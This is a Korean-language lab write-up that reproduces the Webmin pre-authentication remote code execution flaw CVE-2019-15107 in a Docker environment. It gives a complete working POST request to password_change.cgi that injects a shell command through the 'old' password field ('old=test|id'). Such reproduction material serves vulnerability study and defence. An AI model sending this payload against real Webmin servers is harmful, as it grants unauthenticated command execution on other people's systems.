# Webmin 사전 인증 원격 코드 실행(CVE-2019-15107)
### Contributors
* [신은별(@eunbye01)](https://github.com/eunbye01)

Webmin은 유닉스 계열 시스템을 위한 웹 기반 시스템 구성 도구로, 암호 리셋 페이지에 취약성이 있으며, 이를 통해 인증되지 않은 사용자가 간단한 POST 요청을 통해 임의의 명령을 실행할 수 있습니다.

참조링크: 
- https://www.pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html
- https://www.exploit-db.com/exploits/47230
- https://blog.firosolutions.com/exploits/webmin/

# 환경 구성
다음 명령을 통해 취약한 Webmin 1.910을 시작합니다.
```
docker compose up -d
```
환경이 시작된 후 Webnim 로그인 페이지는 'https://your-ip:10000'에서 확인하실 수 있습니다.


## 취약성 재현

참조 링크의 payload가 불완전합니다. 코드를 자세히 읽어본 결과, 1.920 이전, 1.920, 제한 없이 본체의 사용자 파라미터가 존재하지 않는 경우에만 명령을 수행할 수 있음을 발견했습니다.

간단히 말해서, 'id' 명령을 실행하기 위해 다음과 같은 POST 요청을 보내는 것입니다.

```
POST /password_change.cgi HTTP/1.1
Host: your-ip:10000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Cookie: redirect=1; testing=1; sid=x; sessiontest=1
Referer: https://your-ip:10000/session_login.cgi
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2
```

![](1.png)